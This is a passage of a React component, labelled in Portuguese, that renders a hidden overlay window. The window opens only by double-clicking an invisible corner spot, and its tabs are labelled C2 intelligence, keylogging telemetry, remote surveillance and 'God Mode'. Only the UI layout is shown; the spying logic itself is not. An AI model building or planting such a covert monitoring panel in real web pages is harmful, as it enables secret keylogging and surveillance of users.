      <div style={{ display: 'flex', alignItems: 'center', marginTop: '8px' }}>
        <span style={{ marginRight: '8px', color: '#3B82F6', fontWeight: 'bold' }}>~ %</span>
        <input ref={cmdInputRef} type="text" value={cmdInput} onChange={(e) => setCmdInput(e.target.value)} onKeyDown={processCommand} style={{ flex: 1, backgroundColor: 'transparent', border: 'none', outline: 'none', color: 'white', fontFamily: 'monospace', fontSize: '13px', pointerEvents: 'auto' }} spellCheck="false" autoComplete="off" />
      </div>
      <div ref={cmdEndRef} />
    </div>
  );

  /* STREAMING_CHUNK: Renderização Principal */
  if (!isOpen) {
    return (
      <div style={{ position: 'fixed', bottom: 0, right: 0, width: '64px', height: '64px', zIndex: 999999, opacity: 0, cursor: 'crosshair', display: 'flex', alignItems: 'flex-end', justifyContent: 'flex-end', padding: '8px', pointerEvents: 'auto' }} onMouseEnter={(e) => e.currentTarget.style.opacity = 0.2} onMouseLeave={(e) => e.currentTarget.style.opacity = 0} onDoubleClick={() => setIsOpen(true)}>
        <div style={{ width: '12px', height: '12px', borderRadius: '50%', backgroundColor: '#3B82F6', boxShadow: '0 0 10px #3b82f6' }}></div>
      </div>
    );
  }

  const windowStyle = { position: 'absolute', display: 'flex', overflow: 'hidden', transition: 'all 0.3s ease-in-out', backgroundColor: 'rgba(30, 30, 30, 0.85)', backdropFilter: 'blur(24px)', WebkitBackdropFilter: 'blur(24px)', border: godModeActive ? '2px solid #ef4444' : '1px solid rgba(255, 255, 255, 0.1)', boxShadow: godModeActive ? '0 0 30px rgba(239, 68, 68, 0.4)' : '0 25px 50px -12px rgba(0, 0, 0, 0.5)', fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif', color: 'white', pointerEvents: 'auto', ...(isExpanded ? { inset: 0, borderRadius: 0 } : { top: '10vh', left: '10vw', width: '85vw', height: '80vh', borderRadius: '16px', transform: `translate(${dragPos.x}px, ${dragPos.y}px)` }) };

  return (
    <div style={{ position: 'fixed', inset: 0, zIndex: 999999, display: 'flex', alignItems: 'center', justifyContent: 'center', pointerEvents: 'none' }}>
      <div style={windowStyle}>
        
        {/* SIDEBAR */}
        <div style={{ width: '224px', backgroundColor: 'rgba(0, 0, 0, 0.4)', borderRight: '1px solid rgba(255, 255, 255, 0.1)', display: 'flex', flexDirection: 'column', zIndex: 10, pointerEvents: 'auto' }}>
          <div style={{ height: '56px', display: 'flex', alignItems: 'center', padding: '0 16px', gap: '8px', cursor: isExpanded ? 'default' : 'grab', borderBottom: '1px solid rgba(255, 255, 255, 0.05)' }} onMouseDown={handleMouseDown}>
            <div style={{ display: 'flex', gap: '8px' }} onMouseDown={e => e.stopPropagation()}>
              <button onClick={(e) => { e.stopPropagation(); setIsOpen(false); }} style={{ width: '12px', height: '12px', borderRadius: '50%', backgroundColor: '#FF5F56', border: 'none', cursor: 'pointer', pointerEvents: 'auto' }}></button>
              <button onClick={(e) => { e.stopPropagation(); setIsExpanded(false); }} style={{ width: '12px', height: '12px', borderRadius: '50%', backgroundColor: '#FFBD2E', border: 'none', cursor: 'pointer', pointerEvents: 'auto' }}></button>
              <button onClick={(e) => { e.stopPropagation(); setIsExpanded(true); }} style={{ width: '12px', height: '12px', borderRadius: '50%', backgroundColor: '#27C93F', border: 'none', cursor: 'pointer', pointerEvents: 'auto' }}></button>
            </div>
          </div>

          <div style={{ flex: 1, padding: '16px 12px', display: 'flex', flexDirection: 'column', gap: '4px', overflowY: 'auto' }}>
            <div style={{ fontSize: '10px', fontWeight: 'bold', letterSpacing: '0.1em', color: '#71717A', textTransform: 'uppercase', marginBottom: '8px', padding: '0 8px' }}>Core Tools</div>
            <button onClick={(e) => { e.stopPropagation(); setActiveTab('console'); }} style={{ width: '100%', display: 'flex', alignItems: 'center', padding: '8px 12px', borderRadius: '8px', fontSize: '13px', fontWeight: 500, border: 'none', backgroundColor: activeTab === 'console' ? '#2563EB' : 'transparent', color: activeTab === 'console' ? 'white' : '#A1A1AA', cursor: 'pointer', pointerEvents: 'auto' }}><Terminal size={16} style={{marginRight: '12px'}} /> Terminal</button>
            <button onClick={(e) => { e.stopPropagation(); setActiveTab('architecture'); }} style={{ width: '100%', display: 'flex', alignItems: 'center', padding: '8px 12px', borderRadius: '8px', fontSize: '13px', fontWeight: 500, border: 'none', backgroundColor: activeTab === 'architecture' ? '#2563EB' : 'transparent', color: activeTab === 'architecture' ? 'white' : '#A1A1AA', cursor: 'pointer', pointerEvents: 'auto' }}><LayoutTemplate size={16} style={{marginRight: '12px'}} /> Arquitetura</button>

            <div style={{ fontSize: '10px', fontWeight: 'bold', letterSpacing: '0.1em', color: '#71717A', textTransform: 'uppercase', marginTop: '16px', marginBottom: '8px', padding: '0 8px' }}>Inteligência C2</div>
            <button onClick={(e) => { e.stopPropagation(); setActiveTab('network'); }} style={{ width: '100%', display: 'flex', alignItems: 'center', padding: '8px 12px', borderRadius: '8px', fontSize: '13px', fontWeight: 500, border: 'none', backgroundColor: activeTab === 'network' ? 'rgba(96, 165, 250, 0.2)' : 'transparent', color: activeTab === 'network' ? '#60A5FA' : '#A1A1AA', cursor: 'pointer', pointerEvents: 'auto' }}><Wifi size={16} style={{marginRight: '12px'}} /> Rede & APIs</button>
            <button onClick={(e) => { e.stopPropagation(); setActiveTab('telemetry'); }} style={{ width: '100%', display: 'flex', alignItems: 'center', padding: '8px 12px', borderRadius: '8px', fontSize: '13px', fontWeight: 500, border: 'none', backgroundColor: activeTab === 'telemetry' ? 'rgba(244, 114, 182, 0.2)' : 'transparent', color: activeTab === 'telemetry' ? '#F472B6' : '#A1A1AA', cursor: 'pointer', pointerEvents: 'auto' }}><MousePointer size={16} style={{marginRight: '12px'}} /> Telemetria (Keylog)</button>

            <div style={{ fontSize: '10px', fontWeight: 'bold', letterSpacing: '0.1em', color: '#71717A', textTransform: 'uppercase', marginTop: '16px', marginBottom: '8px', padding: '0 8px' }}>Exploração</div>
            <button onClick={(e) => { e.stopPropagation(); setGodModeActive(!godModeActive); }} style={{ width: '100%', display: 'flex', alignItems: 'center', padding: '8px 12px', borderRadius: '8px', fontSize: '13px', fontWeight: 500, border: godModeActive ? '1px solid rgba(239, 68, 68, 0.3)' : '1px solid transparent', backgroundColor: godModeActive ? 'rgba(239, 68, 68, 0.2)' : 'transparent', color: godModeActive ? '#F87171' : '#A1A1AA', cursor: 'pointer', pointerEvents: 'auto' }}>
              <Crosshair size={16} style={{marginRight: '12px', animation: godModeActive ? 'spin 3s linear infinite' : 'none'}} /> God Mode {godModeActive ? '(ON)' : ''}
            </button>
            <button onClick={(e) => { e.stopPropagation(); setActiveTab('artifacts'); setNewArtifactBadge(0); }} style={{ width: '100%', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '8px 12px', borderRadius: '8px', fontSize: '13px', fontWeight: 500, border: 'none', backgroundColor: activeTab === 'artifacts' ? 'rgba(255, 255, 255, 0.1)' : 'transparent', color: activeTab === 'artifacts' ? 'white' : '#A1A1AA', cursor: 'pointer', pointerEvents: 'auto' }}>
              <div style={{ display: 'flex', alignItems: 'center' }}><Box size={16} style={{marginRight: '12px'}} /> Relatórios</div>
              {newArtifactBadge > 0 && <span style={{ backgroundColor: '#3B82F6', color: 'white', fontSize: '10px', padding: '2px 6px', borderRadius: '9999px', fontWeight: 'bold' }}>{newArtifactBadge}</span>}
            </button>
            <button onClick={(e) => { e.stopPropagation(); setActiveTab('media'); }} style={{ width: '100%', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '8px 12px', borderRadius: '8px', fontSize: '13px', fontWeight: 500, border: 'none', backgroundColor: activeTab === 'media' ? 'rgba(168, 85, 247, 0.2)' : 'transparent', color: activeTab === 'media' ? '#A855F7' : '#A1A1AA', cursor: 'pointer', pointerEvents: 'auto' }}>
              <div style={{ display: 'flex', alignItems: 'center' }}><Radio size={16} style={{marginRight: '12px'}} /> Vigilância Remota</div>
              {mediaStream && <div style={{ width: '6px', height: '6px', borderRadius: '50%', backgroundColor: '#EF4444', boxShadow: '0 0 5px #EF4444' }}></div>}
            </button>
          </div>
        </div>

        {/* ÁREA DE CONTEÚDO */}
        <div style={{ flex: 1, display: 'flex', flexDirection: 'column', position: 'relative', overflow: 'hidden', backgroundColor: 'transparent' }}>
          <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '56px', backgroundColor: 'transparent', zIndex: 0, cursor: isExpanded ? 'default' : 'grab', pointerEvents: 'auto' }} onMouseDown={handleMouseDown}></div>
          <div style={{ flex: 1, position: 'relative', zIndex: 10, height: '100%', display: 'flex', flexDirection: 'column', pointerEvents: 'auto' }}>
            {activeTab === 'console' && renderConsole()}
            {activeTab === 'architecture' && renderExplorer()}
            {activeTab === 'network' && renderNetworkModule()}
            {activeTab === 'telemetry' && renderTelemetryModule()}
            {activeTab === 'artifacts' && renderArtifactsMenu()}
            {activeTab === 'media' && renderMediaModule()}
          </div>
        </div>

      </div>
    </div>
  );
}